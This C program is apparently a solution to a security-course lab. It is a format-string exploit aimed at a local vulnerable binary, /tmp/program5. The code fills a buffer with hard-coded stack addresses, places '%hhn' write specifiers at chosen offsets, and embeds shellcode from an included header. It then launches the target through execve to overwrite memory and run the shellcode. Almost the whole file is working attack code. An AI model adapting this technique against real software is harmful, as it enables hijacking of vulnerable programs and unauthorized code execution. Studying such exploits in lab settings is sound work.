#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program5"

int main(void)
{
  char *args[3];
  char *environ[1];
  char input[400];
  int i;
  // test field
  char tester[4];
  // init with dummy
  for(i=0;i<400;i++){
    input[i] = (char)0xff;
  }
  // write head in order
  int* input_intptr = (int*)input;
  *(input_intptr + 0) = 0xffffdcbc;
  *(input_intptr + 1) = 0xffffdcbd;
  *(input_intptr + 2) = 0xffffdcbe;
  *(input_intptr + 3) = 0xffffdcbf;

  // insert 4 %hhn
  input[80] = '%';
  input[81] = 'h';
  input[82] = 'h';
  input[83] = 'n';
  
  input[224] = '%';
  input[225] = 'h';
  input[226] = 'h';
  input[227] = 'n';

  input[263] = '%';
  input[264] = 'h';
  input[265] = 'h';
  input[266] = 'n';

  input[267] = '%';
  input[268] = 'h';
  input[269] = 'h';
  input[270] = 'n';

  // copy shellcode into [300-344], without '\0' in this way;
  for(i = 0; i<strlen(shellcode); i++){
    input[i+316] = shellcode[i];
  }
  // printf("len of shellcode:%d\n",strlen(shellcode));
  // printf(input,&tester[0],&tester[1],&tester[2],&tester[3]);
  // printf("tester v:%x\n",*((int*)tester));
  // 
  args[0] = PROGRAM;
  args[1] = (char*)&input;
  args[2] = NULL;
  environ[0] = NULL;
  // input test
  //printf("len 0f input:%d\n",strlen(args[1]));
  // printf(input);
  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
